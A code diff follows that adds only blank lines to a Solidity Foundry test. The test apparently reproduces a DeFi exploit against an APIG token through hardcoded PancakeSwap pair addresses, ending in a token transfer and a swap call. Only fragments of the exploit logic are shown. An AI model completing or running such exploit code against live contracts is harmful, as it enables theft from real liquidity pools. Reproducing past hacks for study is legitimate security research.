@@ -15,6 +15,7 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IBEP20 {
+
     function totalSupply() external view returns (uint256);
 
     function decimals() external view returns (uint8);
@@ -38,9 +39,11 @@ interface IBEP20 {
     event Transfer(address indexed from, address indexed to, uint256 value);
 
     event Approval(address indexed owner, address indexed spender, uint256 value);
+
 }
 
 contract ContractTest is Test {
+
     IPancakePair aDaDPair = IPancakePair(0xaDaD973f8920bc511d94aade2762284f621F1467);
     IPancakePair EfBfPair = IPancakePair(0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d);
     IPancakePair b920Pair = IPancakePair(0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce);
@@ -101,4 +104,5 @@ contract ContractTest is Test {
         APIG.transfer(address(b920Pair), APIG.balanceOf(address(this)));
         b920Pair.swap(amount59500, 0, address(this), "");
     }
+
 }
